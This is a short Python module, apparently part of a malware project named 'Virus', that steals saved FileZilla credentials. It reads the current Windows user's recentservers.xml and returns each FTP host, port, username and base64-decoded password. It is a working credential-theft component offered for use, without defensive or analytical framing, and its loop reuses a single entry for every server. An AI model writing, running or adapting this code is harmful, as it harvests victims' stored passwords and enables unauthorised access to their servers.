from Virus.Helpers.Support import current_user
import xml.etree.ElementTree as ET
import base64


def FileZilla():
    try:
        path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\FileZilla\\recentservers.xml'
        filezilla = ET.parse(path)

        profiles = []
        temp = []

        for _ in filezilla.findall('.//Server'):
            temp.append(f"ftp://{filezilla.find('.//Host').text}:{filezilla.find('.//Port').text}/")
            temp.append(filezilla.find('.//User').text)
            temp.append((base64.b64decode(filezilla.find('.//Pass').text)).decode())
            profiles.append(temp)

        print(profiles)
        return profiles
    except:
        return 'Error'
